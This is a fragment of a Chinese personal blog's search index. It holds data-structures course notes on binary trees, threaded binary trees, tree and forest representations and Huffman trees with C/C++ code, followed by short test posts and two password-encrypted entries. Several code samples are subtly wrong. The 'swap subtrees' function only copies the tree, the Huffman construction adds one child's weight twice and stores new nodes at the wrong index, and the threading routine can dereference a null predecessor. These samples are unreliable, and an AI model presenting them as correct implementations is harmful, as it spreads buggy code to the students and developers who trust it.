class="line">&#125;</span><br></pre></td></tr></table></figure><p>求结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">NodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">NodesNum</span>(b-&gt;lch)+<span class="built_in">NodesNum</span>(b-&gt;rch)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求叶子结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">LeafNodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b-&gt;lch==<span class="literal">NULL</span>&amp;&amp;b-&gt;rch==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        num1=<span class="built_in">LeafNodesNum</span>(b-&gt;lch);</span><br><span class="line">        num2=<span class="built_in">LeafNodesNum</span>(b-&gt;rch);</span><br><span class="line">        <span class="keyword">return</span> (num1+num2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制树的操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Copy</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;rch,t-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交换左右子树：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Swap</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;rch,t-&gt;rch);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求树的高度：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(BiTree t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> tl,tr;</span><br><span class="line">    <span class="keyword">if</span>(t==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tl=<span class="built_in">height</span>(t-&gt;lch);</span><br><span class="line">    tr=<span class="built_in">height</span>(t-&gt;rch);</span><br><span class="line">    <span class="keyword">if</span>(tl&gt;=tr) <span class="keyword">return</span> tl+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> tr+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>给定遍历序列是否可以确定树的唯一结构？</p><p>只给出一个序列，无法确定树的唯一结构</p><p>给出前序和后序序列，无法确定唯一的二叉树</p><p>给出中序和后序序列，可以确定唯一的二叉树</p><p>给出中序和前序序列，可以确定唯一的二叉树</p><p>问题：给出前序和中序序列，如何构建二叉树？</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateTree</span><span class="params">(BiTree &amp;T,<span class="type">int</span> root,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">char</span> *m,<span class="type">char</span> *n)</span>   <span class="comment">//创建二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T=(BiNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiNode));</span><br><span class="line">    <span class="keyword">if</span>(start&gt;end)</span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=start;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;end&amp;&amp;n[i]!=m[root])</span><br><span class="line">        i++;</span><br><span class="line">    T-&gt;data=n[i];</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;lch,root+<span class="number">1</span>,start,i<span class="number">-1</span>,m,n);</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;rch,root+<span class="number">1</span>+i-start,i+<span class="number">1</span> ,end,m,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>既可以指示前驱又可以指示后继的双链结构的二叉树称为线索二叉树</p><p>若结点有左子树，则lch指示左孩子，否则指示其前驱</p><p>若结点有右子树，则rch指示其右孩子，否则指示其后继</p><h4 id="结点结构"><a href="#结点结构" class="headerlink" title="结点结构"></a>结点结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br></pre></td></tr></table></figure><p>ltag=0 lch指向左孩子 ltag=1 lch指向前驱</p><p>ltag=0 rch指向右孩子 ltag=1 rch指向后继</p><h4 id="二叉树的线索化"><a href="#二叉树的线索化" class="headerlink" title="二叉树的线索化"></a>二叉树的线索化</h4><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *lch,*rch;</span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br><span class="line">BiThrTree pre=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中序线索化：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;lch);</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;lch)&#123;</span><br><span class="line">            p-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">            p-&gt;lch=pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rch)&#123;</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">            pre-&gt;rch=p;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=p;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderThreading</span><span class="params">(BiThrTree &amp;Thrt,BiThrTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(Thrt=(threadbithptr*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(threadbithptr))))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Thrt-&gt;ltag=<span class="number">0</span>;</span><br><span class="line">    Thrt-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    Thrt-&gt;rch=Thrt;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;</span><br><span class="line">        Thrt-&gt;lch=Thrt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Thrt-&gt;lch=T;</span><br><span class="line">        pre=Thrt;</span><br><span class="line">        <span class="built_in">InThreading</span>(T);</span><br><span class="line">        pre-&gt;rch=Thrt;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">        Thrt-&gt;rch=pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的后继：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderNext</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;rtag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        q=p-&gt;rch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;lch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的前驱：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderPre</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ltag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q=p-&gt;lch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;rtag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;rch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历中序线索二叉树的非递归算法：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h3><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><h5 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h5><p>采用一组连续空间存储树的结点，通过保存每个结点的双亲结点的位置，表示树中结点关系的位置结构。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br></pre></td></tr></table></figure><h5 id="孩子链表表示法"><a href="#孩子链表表示法" class="headerlink" title="孩子链表表示法"></a>孩子链表表示法</h5><p>对树的每个结点用线性链表存储它的孩子结点。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="带双亲的孩子链表表示法"><a href="#带双亲的孩子链表表示法" class="headerlink" title="带双亲的孩子链表表示法"></a>带双亲的孩子链表表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CSNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">CSNode</span> *firstchild,*firstbrother;</span><br><span class="line">&#125;CSNode,*CSTree;</span><br></pre></td></tr></table></figure><h4 id="树、森林与二叉树的转化"><a href="#树、森林与二叉树的转化" class="headerlink" title="树、森林与二叉树的转化"></a>树、森林与二叉树的转化</h4><h5 id="树到二叉树"><a href="#树到二叉树" class="headerlink" title="树到二叉树"></a>树到二叉树</h5><p>1)在所有兄弟结点之间加一条连线。</p><p>2)对每个结点，除了保留与其长子的连线外，去掉该结点与其他孩子的连线。</p><h5 id="森林到二叉树"><a href="#森林到二叉树" class="headerlink" title="森林到二叉树"></a>森林到二叉树</h5><p>1)将森林中的每一棵树转化为二叉树</p><p>2)将各二叉树的根结点视为兄弟连在一起</p><h4 id="树的遍历-1"><a href="#树的遍历-1" class="headerlink" title="树的遍历"></a>树的遍历</h4><p>一般不中序遍历</p><p>两条路径：从左到右、从上到下</p><p><strong>树的前序遍历</strong>与转换成<strong>二叉树的前序遍历</strong>相同</p><p><strong>树的后序遍历</strong>与转换成<strong>二叉树的中序遍历</strong>相同</p><h3 id="赫夫曼树及其应用"><a href="#赫夫曼树及其应用" class="headerlink" title="赫夫曼树及其应用"></a>赫夫曼树及其应用</h3><p>基本概念</p><p>路径长度：路径上边的个数</p><p>树的路径长度：从根结点出发，到所有结点的路径长度之和</p><p>结点的带权路径长度：结点到根结点的长度与权重的乘积</p><p>树的带权路径长度：所有叶子结点的带权路径长度之和</p><h4 id="赫夫曼树的定义"><a href="#赫夫曼树的定义" class="headerlink" title="赫夫曼树的定义"></a>赫夫曼树的定义</h4><p>最优二叉树，给定叶结点权重，具有最小带权路径长度的二叉树。</p><h4 id="构造赫夫曼树-赫夫曼算法"><a href="#构造赫夫曼树-赫夫曼算法" class="headerlink" title="构造赫夫曼树(赫夫曼算法)"></a>构造赫夫曼树(赫夫曼算法)</h4><p>基本思想：使权值大的叶子结点尽量靠近根节点，而使权值小的叶子结点尽量远离根结点</p><p>将给定的一些叶子结点中取出两个最小的叶子作为一个结点的左孩子和右孩子，然后将它们的权值相加，从剩下的叶子中寻找最小的结点作为上面结点的兄弟，重复此操作。</p><p>n个叶结点，按上述操作，构造的树中含有2n-1个结点。</p><p><img src="/2023/11/14/赫夫曼树构造.png" alt="image4"></p><p>huffman算法实现：</p><p>主函数先给n，m赋值。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">    <span class="type">int</span> lch,rch,parent;</span><br><span class="line">&#125;hufmtree;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateHuffmanTree</span><span class="params">(hufmtree tree[])</span></span>&#123;<span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        tree[i].weight=<span class="number">0.0</span>;</span><br><span class="line">        tree[i].lch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].rch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].parent=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InputWeight</span><span class="params">(hufmtree tree[])</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">float</span> small1,small2,f;</span><br><span class="line">    <span class="type">int</span> i,j,p1,p2;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n输入第%d个权值:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;w);</span><br><span class="line">        tree[i].weight=w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&lt;m;i++)&#123;<span class="comment">//把合并后的结点放入n～m向量</span></span><br><span class="line">        p1=<span class="number">0</span>;p2=<span class="number">0</span>;    <span class="comment">//两个根结点在tree中的下标</span></span><br><span class="line">        small1=MAXFLOAT;<span class="comment">//MAXFLOAT为最大浮点数</span></span><br><span class="line">        small2=MAXFLOAT;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i<span class="number">-1</span>;j++)&#123;<span class="comment">//选择两个最小的权</span></span><br><span class="line">            <span class="keyword">if</span>(tree[j].parent==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tree[j].weight&lt;small1)&#123;</span><br><span class="line">                    small2=small1;<span class="comment">//更新最小权，次小权，及其位置</span></span><br><span class="line">                    small1=tree[j].weight;<span class="comment">//找出最小权</span></span><br><span class="line">                    p2=p1;</span><br><span class="line">                    p1=j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(tree[j].weight&lt;small2)&#123;</span><br><span class="line">                    small2=tree[j].weight;<span class="comment">//改变次小权及位置</span></span><br><span class="line">                    p2=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tree[p1].parent=i+<span class="number">1</span>;</span><br><span class="line">        tree[p2].parent=i+<span class="number">1</span>;</span><br><span class="line">      <span class="comment">//将新生成的结点放在tree[i+1]</span></span><br><span class="line">        tree[i+<span class="number">1</span>].lch=p1;</span><br><span class="line">        tree[i+<span class="number">1</span>].rch=p2;</span><br><span class="line">        tree[i+<span class="number">1</span>].weight=tree[p1].weight+tree[p1].weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="赫夫曼编码"><a href="#赫夫曼编码" class="headerlink" title="赫夫曼编码"></a>赫夫曼编码</h4><p>1)首先构造出赫夫曼树</p><p>2)每个结点的左分支计0 右分支计1，从根结点到叶子结点的沿途路径分支组成的01代码串即赫夫曼编码</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>个人博客基本部署成功！</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>11.09日我的博客基本部署成功了，有一些基本的美化功能（借鉴各路大佬）<br>接下来预计将会逐步完善各项功能，留言板已开，可以多多留言<br>预计接下来会发布内容关于：<br>1.ctf题目/工具解答 本人misc做的多点，预计一个月内发布一篇misc工具合集介绍。<br>2.学校的课程内容，主要是为了复习+记录。<br>3.个人日常板块还没做，迟早会发。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>a basic test</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>test test tes</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>今日测试</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="314b778ccd1012cad8846435536f091270f2b36b97591be73fd3ae3f00163cdd">10d79030e8222445804370796b90fca18d3af0ca0aed65002f2d27e5161276f9a34ce6f47914fa2d3c77a4530036ebbf49392c613893bc04a4747ee94fb4d5f88c16dc93152c4f00c0ef25a2ae27d29cd3b7a1c8f2dba4224c6e826413ea97a1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>work_12.11</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4237b5ab9b62ff40e91ec2f2339630465adbd8b2917c54802b887802653cdc78">01c5434afc057ec70c0b06aa0591fac6feaac8ea76c74c2a16a82314c7311e3d7a8f6737cf7b5c9038c6896dbf539075414845885f166cbc4c60fc4e2685be30b483fc1b39384fa2edc582211d27467ff62aac53660ebd6b7cbe4aff2b8872e220eb40bd790ff5838c8e22b6a2b2e12cafa1ba3d29e51f2b55cbeab4c022e21298cf2583bbf44aa28cd5bb30cdc842aa07134361303d2e403741d7cee9bc62af</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test4blog</title>
      <link href="/2023/11/08/"/>
      <url>/2023/11/08/</url>
      
        <content type="html"><![CDATA[<p>This is a test for lincoxi to test if his blog works ok.</p><p>My github account is cyan4run. It’s easy to recongnize.</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
